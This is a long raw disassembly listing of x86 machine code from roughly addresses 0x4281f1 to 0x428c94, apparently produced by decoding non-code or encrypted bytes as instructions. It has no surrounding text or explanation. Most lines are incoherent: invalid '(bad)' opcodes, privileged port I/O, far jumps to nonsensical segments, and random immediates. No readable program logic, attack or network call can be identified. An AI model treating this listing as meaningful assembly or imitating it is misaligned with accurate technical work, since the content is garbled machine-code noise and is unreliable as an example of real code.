  4281f1:	sbb    al,BYTE PTR [edx+0x5442eb4e]
  4281f7:	inc    esp
  4281f8:	(bad)  
  4281f9:	xor    eax,0xabc1798d
  4281fe:	mov    cl,0x4b
  428200:	scas   al,BYTE PTR es:[edi]
  428201:	pop    ss
  428202:	jmp    0x4281cb
  428204:	push   esi
  428205:	mov    DWORD PTR [ebp-0x3e3ea379],esi
  42820b:	call   0xb5e0a717
  428210:	loope  0x4281d3
  428212:	popa   
  428213:	pop    esi
  428214:	mov    eax,0x14e2825a
  428219:	fsub   DWORD PTR [edx-0x72bac179]
  42821f:	mov    dl,0xc9
  428221:	push   edi
  428222:	sub    esi,DWORD PTR [edi+0x69]
  428225:	aad    0xea
  428227:	push   eax
  428228:	inc    ebp
  428229:	sbb    esp,edx
  42822b:	inc    edi
  42822c:	xor    bl,al
  42822e:	out    0xd6,eax
  428230:	jno    0x428232
  428232:	in     al,0x46
  428234:	sbb    BYTE PTR ds:0xd907c1c5,dh
  42823a:	xchg   ebx,eax
  42823b:	inc    ebp
  42823c:	push   esi
  42823d:	repnz cmp DWORD PTR [edi+0x58873adc],esi
  428244:	xchg   ebx,eax
  428245:	and    ch,BYTE PTR [eax-0x22]
  428248:	test   eax,0x29e4e4bc
  42824d:	adc    al,0x7f
  42824f:	fcomp  QWORD PTR [ebx-0x16]
  428252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428253:	rol    DWORD PTR [esi],cl
  428255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428256:	mov    esp,0xae892144
  42825b:	or     DWORD PTR [esi+0x17],esp
  42825e:	dec    esp
  42825f:	jmp    0x975d:0x7c90e0a3
  428266:	jne    0x4282c7
  428268:	add    eax,0xd4147c3d
  42826d:	icebp  
  42826e:	sbb    ecx,DWORD PTR [eax+0x5b97bde0]
  428274:	lods   eax,DWORD PTR ds:[esi]
  428275:	ret    0x6ce
  428278:	jl     0x4282d2
  42827a:	xchg   edi,eax
  42827b:	inc    ebx
  42827c:	jle    0x42822e
  42827e:	push   eax
  42827f:	jbe    0x428279
  428281:	mov    edx,0xd2fd445e
  428286:	in     al,0x22
  428288:	mov    ecx,0xc161f302
  42828d:	das    
  42828e:	lock jnp 0x428227
	...
  4282f1:	add    BYTE PTR [eax],al
  4282f3:	add    bh,al
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	fsubr  st,st(2)
  428302:	xlat   BYTE PTR ds:[ebx]
  428303:	sub    DWORD PTR [esi+ebp*4],edx
  428306:	add    DWORD PTR [eax],eax
  428308:	add    eax,0x46000001
  42830d:	and    BYTE PTR [eax],0x1e
  428310:	addr16 nop
  428312:	add    dh,BYTE PTR [edx-0x7d3847ea]
  428318:	pop    es
  428319:	cld    
  42831a:	lods   eax,DWORD PTR ds:[esi]
  42831b:	xor    eax,0x46b0f274
  428320:	and    BYTE PTR [edi-0x62a5912c],ah
  428326:	xchg   ebx,eax
  428327:	fist   WORD PTR [ebp+0x4]
  42832a:	jmp    0x4282df
  42832c:	adc    ebp,esp
  42832e:	test   al,0x2c
  428330:	or     al,0x70
  428332:	inc    esp
  428333:	sahf   
  428334:	test   eax,0x25025b5
  428339:	add    eax,0xffffff85
  42833c:	pop    ebx
  42833d:	arpl   cx,cx
  42833f:	and    DWORD PTR [eax],esp
  428341:	imul   esi,esp,0xffffffce
  428344:	(bad)  
  428345:	repnz fistp WORD PTR [edx]
  428348:	ret    0xaf73
  42834b:	and    DWORD PTR [eax],edi
  42834d:	inc    ecx
  42834e:	jecxz  0x42832c
  428350:	pusha  
  428351:	mov    ds:0x4b7d110,al
  428356:	out    0xb4,al
  428358:	add    DWORD PTR [esi-0x7d],ecx
  42835b:	loop   0x428308
  42835d:	add    al,0x60
  42835f:	mov    ss,WORD PTR [ecx]
  428361:	stos   BYTE PTR es:[edi],al
  428362:	pop    eax
  428363:	fild   WORD PTR [edi+0x13d4b2a3]
  428369:	jg     0x428360
  42836b:	and    al,0xd9
  42836d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42836e:	push   0x7371ecdd
  428373:	dec    edx
  428374:	xchg   edx,eax
  428375:	das    
  428376:	fmul   DWORD PTR [esi]
  428378:	jo     0x4283f4
  42837a:	mov    dh,0x6a
  42837c:	daa    
  42837d:	xlat   BYTE PTR ds:[ebx]
  42837e:	in     al,0x81
  428380:	test   DWORD PTR [eax+0x11],ebx
  428383:	inc    eax
  428384:	cmp    cl,BYTE PTR ds:0xa73ba190
  42838a:	mov    al,0xfb
  42838c:	aam    0xb3
  42838e:	rcl    BYTE PTR [edi+0x44970a6],cl
  428394:	repz inc esp
  428396:	test   eax,0x33a1198
  42839b:	jl     0x4283fc
  42839d:	jl     0x428380
  42839f:	gs adc dl,ch
  4283a2:	dec    esp
  4283a3:	or     ebp,ebx
  4283a5:	icebp  
  4283a6:	jno    0x42840b
  4283a8:	dec    esi
  4283a9:	inc    ebp
  4283aa:	cmp    dh,BYTE PTR [ebp-0x75]
  4283ad:	mov    edx,DWORD PTR [ebp+0x52343f11]
  4283b3:	std    
  4283b4:	or     BYTE PTR [ecx+0x6],dl
  4283b7:	cdq    
  4283b8:	mov    esp,0x8e66d2e2
  4283bd:	loop   0x4283ac
  4283bf:	cld    
  4283c0:	dec    esi
  4283c1:	into   
  4283c2:	mov    BYTE PTR [edi-0x4],cl
  4283c5:	push   es
  4283c6:	jae    0x428404
  4283c8:	dec    ebp
  4283c9:	push   ss
  4283ca:	int    0x5c
  4283cc:	test   edx,ecx
  4283ce:	les    edx,FWORD PTR [esi]
  4283d0:	xchg   DWORD PTR [eax],esp
  4283d2:	out    0x39,al
  4283d4:	adc    DWORD PTR [eax],esi
  4283d6:	mov    ds,WORD PTR [edx]
  4283d8:	mov    al,BYTE PTR [edx]
  4283da:	ret    
  4283db:	jge    0x4283eb
  4283dd:	push   ecx
  4283de:	pop    ecx
  4283df:	jne    0x42843d
  4283e1:	and    eax,0x319ad723
  4283e6:	fmul   DWORD PTR ds:0xf31d8dd6
  4283ec:	and    DWORD PTR [edx+0x68],ebx
  4283ef:	sbb    eax,0x9a45063f
  4283f4:	loop   0x4283b3
  4283f6:	mov    ds:0x1e31dea8,al
  4283fb:	mov    ds:0x2afeb400,al
  428400:	jno    0x428415
  428402:	fdivrp st(0),st
  428404:	ret    
  428405:	aad    0xd1
  428407:	sahf   
  428408:	pop    edx
  428409:	into   
  42840a:	into   
  42840b:	mov    esi,0x73aa4c78
  428410:	and    eax,DWORD PTR [eax]
	...
  428472:	add    BYTE PTR [eax],al
  428474:	push   cs
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x7aabfb32
  428481:	push   edx
  428482:	(bad)  
  428483:	aad    0x19
  428485:	scas   eax,DWORD PTR es:[edi]
  428486:	add    DWORD PTR [eax],eax
  428488:	add    eax,0xfa000001
  42848d:	in     al,dx
  42848e:	add    eax,DWORD PTR [edi+0x34]
  428491:	or     BYTE PTR [ebp-0x564b0e13],0xef
  428498:	fstp   DWORD PTR [ebp+0x2f]
  42849b:	push   esi
  42849c:	xor    esi,DWORD PTR [esi]
  42849e:	lahf   
  42849f:	or     al,0xb2
  4284a1:	pop    ecx
  4284a2:	call   0x15d75db
  4284a7:	xor    eax,ebp
  4284a9:	sub    DWORD PTR [edx],0x3db626de
  4284af:	mov    al,ds:0x2165e6ca
  4284b4:	cmp    al,0xa0
  4284b6:	or     BYTE PTR [ebp+0x9af52ae],ch
  4284bc:	lds    eax,FWORD PTR [edx-0x79]
  4284bf:	repz test DWORD PTR ss:[eax-0x6358219b],0x845196b4
  4284cb:	push   ecx
  4284cc:	int    0x19
  4284ce:	(bad)  
  4284cf:	xor    edx,DWORD PTR [ecx+0x2700d489]
  4284d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4284d6:	cmp    al,0xfb
  4284d8:	dec    esp
  4284d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284da:	mov    ds:0xff5a8288,eax
  4284df:	dec    edi
  4284e0:	push   0x5386bb71
  4284e5:	mov    al,ds:0x54e77901
  4284ea:	inc    ecx
  4284eb:	and    al,0x43
  4284ed:	or     al,0xeb
  4284ef:	mov    cl,0xd
  4284f1:	xchg   ebp,ecx
  4284f3:	and    ebx,DWORD PTR [esi-0x9]
  4284f6:	sbb    cl,BYTE PTR [ebx+0x30]
  4284f9:	outs   dx,BYTE PTR ds:[esi]
  4284fa:	xlat   BYTE PTR ds:[ebx]
  4284fb:	rcr    DWORD PTR [edi-0x3ca880da],cl
  428501:	and    DWORD PTR [ecx-0x23cd87d9],eax
  428507:	pop    ebx
  428508:	xchg   ecx,eax
  428509:	into   
  42850a:	iret   
  42850b:	stos   BYTE PTR es:[edi],al
  42850c:	cmp    BYTE PTR [eax-0x7d],cl
  42850f:	inc    edx
  428510:	jmp    0xd494:0xcfc9f6f5
  428517:	sbb    al,0x3c
  428519:	cmp    al,BYTE PTR ds:0x8411fa06
  42851f:	aad    0xd8
  428521:	sub    dh,bl
  428523:	lea    edx,[eax-0xb70691f]
  428529:	stos   DWORD PTR es:[edi],eax
  42852a:	imul   cl
  42852c:	cdq    
  42852d:	sahf   
  42852e:	mov    eax,ds:0xf7a21f36
  428533:	fnstsw WORD PTR [eax]
  428535:	pop    ds
  428536:	push   eax
  428537:	call   0x29ce:0xbff309c8
  42853e:	cmp    dh,BYTE PTR [ecx]
  428540:	cmp    bl,BYTE PTR [eax+0xcba6d01]
  428546:	sbb    DWORD PTR [edi+0x414872e2],ebx
  42854c:	push   ebx
  42854d:	mov    ah,0x8
  42854f:	adc    dh,BYTE PTR [edx+0x172e3683]
  428555:	push   ss
  428556:	cmp    DWORD PTR [edx],0xdd421e0f
  42855c:	mov    ah,0xd8
  42855e:	xchg   ebx,eax
  42855f:	cmp    ah,al
  428561:	leave  
  428562:	mov    ecx,0x38072625
  428567:	(bad)  
  428568:	out    dx,eax
  428569:	xlat   BYTE PTR ds:[ebx]
  42856a:	or     dl,BYTE PTR [edx]
  42856c:	adc    al,0x71
  42856e:	inc    ecx
  42856f:	mov    cl,0xb8
  428571:	cwde   
  428572:	mov    edi,0xce123a94
  428577:	enter  0xde4,0xf9
  42857b:	out    0x45,al
  42857d:	outs   dx,BYTE PTR ds:[esi]
  42857e:	or     al,0x3b
  428580:	sub    eax,0x22fb2264
  428585:	bound  ecx,QWORD PTR [esi+0x4f75e795]
  42858b:	or     al,0xf7
  42858d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42858e:	add    eax,0x886a
	...
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x3997a3f6
  428602:	iret   
  428603:	and    al,0x1e
  428605:	mov    al,0x1
  428607:	add    BYTE PTR ds:0x61000001,al
  42860d:	mov    ds:0xa01bd520,eax
  428612:	sbb    ecx,DWORD PTR [esi]
  428614:	add    esp,ebp
  428616:	in     al,dx
  428617:	(bad)  
  428618:	and    BYTE PTR [edx+0x4ce3bd30],dh
  42861e:	xchg   ecx,eax
  42861f:	xor    BYTE PTR [ebp-0x76994644],0x9b
  428626:	mov    esi,0xf9724689
  42862b:	sub    dl,bl
  42862d:	xor    ah,ah
  42862f:	jecxz  0x428604
  428631:	mov    ebx,0xefb8fe82
  428636:	in     al,0x5b
  428638:	mov    dh,0x16
  42863a:	add    BYTE PTR [ebp-0x310a746f],0xd2
  428641:	push   ebx
  428642:	and    DWORD PTR [edx+esi*1],edi
  428645:	mov    esp,0xea30a93c
  42864a:	gs out 0x89,al
  42864d:	push   eax
  42864e:	pop    edi
  42864f:	pusha  
  428650:	icebp  
  428651:	lea    ecx,[ecx+0x6f]
  428654:	enter  0x9620,0xa4
  428658:	fadd   QWORD PTR [esi+0x6bbe26b0]
  42865e:	punpcklwd mm6,DWORD PTR [eax+0x78]
  428662:	into   
  428663:	jbe    0x4286ae
  428665:	rol    edx,0x53
  428668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428669:	jno    0x4286a4
  42866b:	add    eax,0x495a9ecb
  428670:	scas   al,BYTE PTR es:[edi]
  428671:	ror    BYTE PTR [ecx],cl
  428673:	outs   dx,BYTE PTR ds:[esi]
  428674:	and    al,0x85
  428676:	jmp    0xb18e0a4c
  42867b:	mov    dl,0x97
  42867d:	pop    ds
  42867e:	(bad)  
  42867f:	jp     0x428666
  428681:	jecxz  0x4286eb
  428683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428684:	mov    dl,0x64
  428686:	xor    eax,0x85277c04
  42868b:	mov    ds:0x6a7ae7b0,al
  428690:	cmp    BYTE PTR [edi+0x64],dl
  428693:	mov    al,0x22
  428695:	test   eax,0x376d26b5
  42869a:	adc    ch,dl
  42869c:	mov    ch,BYTE PTR [edx]
  42869e:	out    dx,eax
  42869f:	mov    dh,0x72
  4286a1:	imul   edx,DWORD PTR [eax],0x33
  4286a4:	sbb    esp,edi
  4286a6:	je     0x428628
  4286a8:	scas   al,BYTE PTR es:[edi]
  4286a9:	shl    DWORD PTR [edi+0x2b],0x44
  4286ad:	jae    0x428714
  4286af:	lahf   
  4286b0:	in     eax,0xdf
  4286b2:	stos   BYTE PTR es:[edi],al
  4286b3:	iret   
  4286b4:	psrld  mm6,QWORD PTR [esi+ebx*4]
  4286b8:	sub    DWORD PTR [eax],edx
  4286ba:	dec    ebp
  4286bb:	dec    esi
  4286bc:	fstp   QWORD PTR [edi-0x3c]
  4286bf:	mov    esi,0x788c14af
  4286c4:	or     bl,BYTE PTR [esi+eax*2]
  4286c7:	ret    0xa598
  4286ca:	stos   BYTE PTR es:[edi],al
  4286cb:	adc    BYTE PTR [eax+0x3d],ah
  4286ce:	ja     0x42867e
  4286d0:	loopne 0x4286d9
  4286d2:	shl    DWORD PTR [edi-0x66],cl
  4286d5:	sbb    BYTE PTR [edi-0x2a],ch
  4286d8:	mov    edi,0x87662590
  4286dd:	xchg   ebp,eax
  4286de:	jmp    0x428669
  4286e0:	pop    esi
  4286e1:	and    ebx,ecx
  4286e3:	pop    edx
  4286e4:	mov    al,0x5f
  4286e6:	add    DWORD PTR [edx+0x16cdbafe],0xffffffab
  4286ed:	loop   0x4286ab
  4286ef:	cs push es
  4286f1:	lds    edx,FWORD PTR [ebx]
  4286f3:	icebp  
  4286f4:	(bad)  
  4286f5:	xor    BYTE PTR fs:[ebp+edx*2+0x15138bb3],cl
  4286fd:	pop    ecx
  4286fe:	dec    ecx
  4286ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428700:	mov    ecx,0xaeb16f3f
  428705:	into   
  428706:	sahf   
  428707:	loope  0x428717
  428709:	adc    DWORD PTR gs:[edi-0x5f2bc02a],ebx
  428710:	cwde   
	...
  428771:	add    BYTE PTR [eax],al
  428773:	add    BYTE PTR [esi+0x5b],dl
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x4367b96
  428783:	push   ecx
  428784:	and    esi,DWORD PTR [ecx+0x1050001]
  42878a:	add    BYTE PTR [eax],al
  42878c:	cli    
  42878d:	inc    DWORD PTR [edx+eiz*8]
  428790:	mov    eax,0xed4936b2
  428795:	add    DWORD PTR [edx+0x5f],ecx
  428798:	test   eax,0xd389d534
  42879d:	add    esp,DWORD PTR [ecx-0x1e]
  4287a0:	movhlps xmm5,xmm7
  4287a3:	jg     0x42873d
  4287a5:	inc    edx
  4287a6:	arpl   dx,cx
  4287a8:	sbb    cl,BYTE PTR [ebx+0x3cfc2eef]
  4287ae:	cmp    DWORD PTR [ecx],0x23
  4287b1:	xchg   ebx,eax
  4287b2:	cmp    eax,0xd3c5b949
  4287b7:	sub    ecx,edi
  4287b9:	ret    0x6507
  4287bc:	std    
  4287bd:	sar    BYTE PTR [ebx+ebx*4-0x69],0xea
  4287c2:	pop    edx
  4287c3:	imul   ebx,DWORD PTR ds:0xd0099189,0xfadee8cf
  4287cd:	lods   al,BYTE PTR ds:[esi]
  4287ce:	jbe    0x428813
  4287d0:	clc    
  4287d1:	sub    al,0xeb
  4287d3:	(bad)  
  4287d4:	std    
  4287d5:	inc    esi
  4287d6:	pop    ebx
  4287d7:	inc    ebp
  4287d8:	ins    DWORD PTR es:[edi],dx
  4287d9:	push   ss
  4287da:	test   BYTE PTR [ebp+ebx*4-0x6e0b60f7],bl
  4287e1:	mov    ebp,0x38844d10
  4287e6:	xor    DWORD PTR [edi-0x3d],0xdad1b988
  4287ed:	in     eax,0x3c
  4287ef:	add    eax,0x4a4795fb
  4287f4:	loope  0x428802
  4287f6:	adc    ebp,DWORD PTR [ecx+0x57521788]
  4287fc:	data16 out 0x84,al
  4287ff:	outs   dx,BYTE PTR ds:[esi]
  428800:	xor    BYTE PTR [esi],cl
  428802:	ins    BYTE PTR es:[edi],dx
  428803:	js     0x428882
  428805:	dec    esi
  428806:	arpl   WORD PTR [ebx-0x54d675c3],di
  42880c:	mov    ch,0xe8
  42880e:	iret   
  42880f:	ror    BYTE PTR [ebp+0x22cde40c],0x26
  428816:	push   0x269a0353
  42881b:	loopne 0x428885
  42881d:	stos   DWORD PTR es:[edi],eax
  42881e:	xchg   esi,eax
  42881f:	push   ds
  428820:	into   
  428821:	enter  0xe338,0x6a
  428825:	test   DWORD PTR [esi-0x224dc4d],0x769138e7
  42882f:	inc    eax
  428830:	push   ss
  428831:	add    eax,0x6498aa03
  428836:	outs   dx,DWORD PTR ds:[esi]
  428837:	dec    ecx
  428838:	sub    BYTE PTR [edx-0x5e],0xef
  42883c:	enter  0x495f,0x81
  428840:	mov    ecx,0x32a2ecfe
  428845:	cmp    ch,bh
  428847:	jmp    0x74cd:0x29b06f36
  42884e:	outs   dx,DWORD PTR ds:[esi]
  42884f:	ds stos BYTE PTR es:[edi],al
  428851:	add    dl,cl
  428853:	fnstsw WORD PTR [ebx-0x66a2a417]
  428859:	or     al,0x87
  42885b:	nop
  42885c:	dec    ebp
  42885d:	push   cs
  42885e:	and    ecx,esp
  428860:	aad    0x5e
  428862:	or     BYTE PTR ds:0x632401ad,ah
  428868:	dec    esi
  428869:	sbb    al,0x45
  42886b:	test   eax,0xd30916c3
  428870:	push   edi
  428871:	sub    BYTE PTR [ebx-0x14],0x62
  428875:	xor    edi,esp
  428877:	sub    esp,esi
  428879:	adc    eax,0xcdb45345
  42887e:	psubq  mm4,QWORD PTR [edi+edi*1]
  428882:	mov    es,edx
  428884:	enter  0xa5a5,0xb3
  428888:	enter  0x1af5,0xf5
  42888c:	jge    0x42882b
  42888e:	cmc    
  42888f:	inc    ebx
  428890:	data16 add BYTE PTR [eax],al
	...
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0x6d1a62f1],bx
  428902:	mov    edx,0x1b228cc
  428907:	add    BYTE PTR ds:0x61000001,al
  42890d:	push   es
  42890e:	push   0x4
  428910:	dec    eax
  428911:	pop    ebx
  428912:	mov    dh,0xb3
  428914:	mov    edi,0xa274c2d9
  428919:	dec    edx
  42891a:	std    
  42891b:	repnz dec edi
  42891d:	inc    esi
  42891e:	pop    esi
  42891f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428920:	inc    esi
  428921:	xor    al,ch
  428923:	(bad)  
  428925:	push   DWORD PTR [edx-0x94ccae]
  42892b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42892c:	push   cs
  42892d:	fild   DWORD PTR [eax+0x11f464c6]
  428933:	les    ebx,FWORD PTR [ebp-0x6b292e4d]
  428939:	fwait
  42893a:	cmp    eax,0x9c70443b
  42893f:	aam    0xf7
  428941:	jle    0x428925
  428943:	pop    edi
  428944:	xchg   ebx,eax
  428945:	mov    bl,0x32
  428947:	cs jecxz 0x428950
  42894a:	icebp  
  42894b:	pop    ebx
  42894c:	cmp    esi,DWORD PTR [ebx]
  42894e:	fild   QWORD PTR [eax+0x43]
  428951:	int    0xcd
  428953:	cmp    eax,0x6ec28d7c
  428958:	lock xor bl,bl
  42895b:	cmp    esp,DWORD PTR [ebp-0x6542949d]
  428961:	or     BYTE PTR [edx-0x47e40d2],cl
  428967:	inc    ebp
  428968:	imul   ebp,DWORD PTR [edx-0x60d4ecfa],0x39
  42896f:	data16 adc al,0xb8
  428972:	add    ecx,DWORD PTR [ecx]
  428974:	lahf   
  428975:	cld    
  428976:	jle    0x428910
  428978:	jns    0x428922
  42897a:	sbb    al,0x92
  42897c:	jno    0x42893c
  42897e:	xchg   ebx,eax
  42897f:	nop
  428980:	outs   dx,DWORD PTR ds:[esi]
  428981:	inc    ebp
  428982:	push   0x37
  428984:	push   ecx
  428985:	popa   
  428986:	push   esp
  428987:	sub    BYTE PTR [eax-0x1f],ah
  42898a:	cli    
  42898b:	sbb    edx,ebp
  42898d:	push   ebx
  42898e:	mov    eax,ds:0x3873fe04
  428993:	mov    DWORD PTR [eax+edi*2],edx
  428996:	mov    al,ds:0xb5d2caa8
  42899b:	xchg   ebp,eax
  42899c:	int    0x4c
  42899e:	push   esp
  42899f:	(bad)  
  4289a0:	cmp    al,bh
  4289a2:	std    
  4289a3:	pushfw 
  4289a5:	or     cl,BYTE PTR [esi-0xf20ab10]
  4289ab:	mov    al,0x74
  4289ad:	jno    0x428962
  4289af:	shl    al,cl
  4289b1:	ins    BYTE PTR es:[edi],dx
  4289b2:	or     DWORD PTR [edx+0x497a4e81],esi
  4289b8:	cwde   
  4289b9:	sahf   
  4289ba:	and    DWORD PTR cs:[ecx+ecx*8-0x7aa15a77],edi
  4289c2:	hlt    
  4289c3:	mov    edi,0xb9afc906
  4289c8:	sub    edx,eax
  4289ca:	adc    eax,0xe25de03b
  4289cf:	pop    ebp
  4289d0:	(bad)  
  4289d1:	retf   
  4289d2:	mov    ebp,DWORD PTR [esi-0x62]
  4289d5:	cmp    dl,BYTE PTR [eax+0x1b]
  4289d8:	xor    al,0x2
  4289da:	dec    eax
  4289db:	lods   al,BYTE PTR ds:[esi]
  4289dc:	adc    DWORD PTR [esi+eiz*2-0x2a],edi
  4289e0:	fdivr  DWORD PTR [esi-0x4e]
  4289e3:	cdq    
  4289e4:	out    dx,eax
  4289e5:	xor    eax,0x7b4fbc47
  4289ea:	jge    0x4289eb
  4289ec:	sbb    edx,esi
  4289ee:	sbb    BYTE PTR [ebp+0x43],ch
  4289f1:	aad    0xee
  4289f3:	cmp    eax,0xe743fd1
  4289f8:	dec    edx
  4289f9:	xlat   BYTE PTR ds:[ebx]
  4289fa:	gs pop esp
  4289fc:	mov    al,ds:0x98a7fbec
  428a01:	fsub   st(3),st
  428a03:	rol    ebp,0x8f
  428a06:	(bad)  
  428a07:	and    ecx,DWORD PTR [edx-0x454cc7b8]
  428a0d:	jmp    0x0:0x376eb6
	...
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax-0x9a38fed]
  428a83:	imul   ebp,DWORD PTR ds:0x50001b3,0x58000001
  428a8d:	cmc    
  428a8e:	(bad)  
  428a8f:	mov    dl,0xc2
  428a91:	mov    cl,0x2f
  428a93:	pop    edi
  428a94:	fstp   TBYTE PTR ds:[edi-0x1120b69f]
  428a9b:	leave  
  428a9c:	test   al,0x86
  428a9e:	push   cs
  428a9f:	xor    esp,DWORD PTR [ebp-0x53]
  428aa2:	mov    ds:0xe48eaba5,al
  428aa7:	sub    BYTE PTR [ebx+0x1c],cl
  428aaa:	mov    dh,BYTE PTR ds:0x784943d
  428ab0:	xor    al,0x2e
  428ab2:	jl     0x428a4c
  428ab4:	mov    ds:0xce0c77d6,al
  428ab9:	in     al,dx
  428aba:	or     ebp,0xffffffe5
  428abd:	or     DWORD PTR [edx],esp
  428abf:	bound  edx,QWORD PTR [ebx]
  428ac1:	lea    ebx,[esi]
  428ac3:	dec    esi
  428ac4:	xor    esi,DWORD PTR [esi]
  428ac6:	xchg   ebx,eax
  428ac7:	adc    al,0x46
  428ac9:	or     al,0x9b
  428acb:	pop    esp
  428acc:	jne    0x428add
  428ace:	fsubrp st(3),st
  428ad0:	pop    es
  428ad1:	repz fwait
  428ad3:	daa    
  428ad4:	mov    ds:0x95a14305,al
  428ad9:	test   al,0xba
  428adb:	repz arpl WORD PTR [edx],dx
  428ade:	inc    edi
  428adf:	xor    ecx,DWORD PTR [ecx-0x4d019e4d]
  428ae5:	mov    dh,0x6e
  428ae7:	jb     0x428a73
  428ae9:	leave  
  428aea:	loopne 0x428adf
  428aec:	xor    eax,0xc552fe5d
  428af1:	iret   
  428af2:	sub    al,0xa8
  428af4:	arpl   di,di
  428af6:	loopne 0x428ac6
  428af8:	and    al,0x52
  428afa:	cli    
  428afb:	fstp   DWORD PTR [edx-0x432cfb9b]
  428b01:	adc    al,0xf2
  428b03:	and    eax,0x855bd443
  428b08:	test   DWORD PTR [ebx-0x51db8024],edi
  428b0e:	or     edi,DWORD PTR [ebp-0x4351d75a]
  428b14:	pop    ds
  428b15:	and    ch,BYTE PTR [edx-0x68]
  428b18:	adc    eax,0x734386ad
  428b1d:	push   0x864e8b98
  428b22:	ret    0x54a3
  428b25:	xor    BYTE PTR [eax-0x37],al
  428b28:	sub    eax,0xedaa45fc
  428b2d:	cmp    al,0x27
  428b2f:	pop    DWORD PTR [edx+0x2a]
  428b32:	mov    ebx,0xa40f3d97
  428b37:	pop    ebp
  428b38:	pop    ds
  428b39:	lds    eax,FWORD PTR [ecx-0x4b]
  428b3c:	jne    0x428b62
  428b3e:	xchg   ecx,eax
  428b3f:	push   ecx
  428b40:	inc    eax
  428b41:	jb     0x428ba1
  428b43:	fsubrp st(2),st
  428b45:	push   edi
  428b46:	adc    eax,0x812b29e5
  428b4b:	out    0xed,eax
  428b4d:	in     al,dx
  428b4e:	fld    TBYTE PTR [eax]
  428b50:	cli    
  428b51:	mov    ss,WORD PTR [esi]
  428b53:	mov    edi,0x3a938d2e
  428b58:	imul   esp,DWORD PTR [ebp-0x2ff4a360],0x35bfd0b8
  428b62:	mov    ch,0x38
  428b65:	add    BYTE PTR [edx],ch
  428b67:	mov    ebp,0x797a44d8
  428b6c:	cld    
  428b6d:	aaa    
  428b6e:	push   cs
  428b6f:	mov    al,0xa0
  428b71:	or     esp,DWORD PTR [ecx]
  428b73:	xor    BYTE PTR [edx-0x67b39026],ch
  428b79:	cmp    al,0xdf
  428b7b:	(bad)  
  428b7c:	out    0xdb,al
  428b7e:	sbb    DWORD PTR [edx+0x26c478c9],0x15
  428b85:	ja     0x428b1c
  428b87:	sbb    edx,ebx
  428b89:	adc    dl,bl
  428b8b:	icebp  
  428b8c:	fild   DWORD PTR [ebx+edx*8-0x3d]
  428b90:	sbb    eax,0x0
	...
  428bf1:	add    BYTE PTR [eax],al
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x8e38e30b
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [ebp-0x35d2da6f],cl
  428c11:	push   ecx
  428c12:	mov    DWORD PTR [eax],ecx
  428c14:	cmp    cl,BYTE PTR [ebx]
  428c16:	ins    BYTE PTR es:[edi],dx
  428c17:	hlt    
  428c18:	or     eax,0x320cbd9
  428c1d:	iret   
  428c1e:	cld    
  428c1f:	aaa    
  428c20:	int    0xcc
  428c22:	mov    ecx,0x5f410eb5
  428c27:	or     BYTE PTR [ecx],ch
  428c29:	fist   DWORD PTR [ecx-0xf]
  428c2c:	mov    ds:0x58c9681d,al
  428c31:	cmp    al,0x69
  428c33:	jne    0x428c3a
  428c35:	xlat   BYTE PTR ds:[ebx]
  428c36:	lock pushf 
  428c38:	(bad)  
  428c39:	and    al,0x8b
  428c3b:	aaa    
  428c3c:	in     al,0x7c
  428c3e:	adc    eax,0x45d03e54
  428c43:	inc    esp
  428c44:	mov    dl,0xe5
  428c46:	add    al,0xf6
  428c48:	mov    BYTE PTR [ecx+eax*4+0x1b4bb7a2],al
  428c4f:	test   DWORD PTR [ebp-0x50],esi
  428c52:	and    BYTE PTR [edi+0xe388bee],dl
  428c58:	mov    al,0x61
  428c5a:	imul   ebp,DWORD PTR [ebp-0x42f0ca57],0x10d2732f
  428c64:	sub    al,BYTE PTR [eax]
  428c66:	bound  edi,QWORD PTR [ebx]
  428c68:	pop    esp
  428c69:	aad    0x43
  428c6b:	jge    0x428cc4
  428c6d:	lods   eax,DWORD PTR ds:[esi]
  428c6e:	lahf   
  428c6f:	(bad)  
  428c70:	cmc    
  428c71:	add    al,0x83
  428c73:	xchg   edi,edx
  428c75:	jnp    0x428cf4
  428c77:	inc    ecx
  428c78:	dec    ebx
  428c79:	fwait
  428c7a:	cmp    al,0xc7
  428c7c:	dec    esp
  428c7d:	or     BYTE PTR [eax-0x3b],0xc8
  428c81:	xlat   BYTE PTR ds:[ebx]
  428c82:	jno    0x428c3a
  428c84:	sbb    al,BYTE PTR [ebx+0x6f]
  428c87:	sahf   
  428c88:	push   ebx
  428c89:	into   
  428c8a:	mov    bh,0xba
  428c8c:	popa   
  428c8d:	cmp    al,0x1c
  428c8f:	pop    es
  428c90:	mov    BYTE PTR [ebx],bh
  428c92:	ss xchg esp,eax
  428c94:	mov    cl,0x97
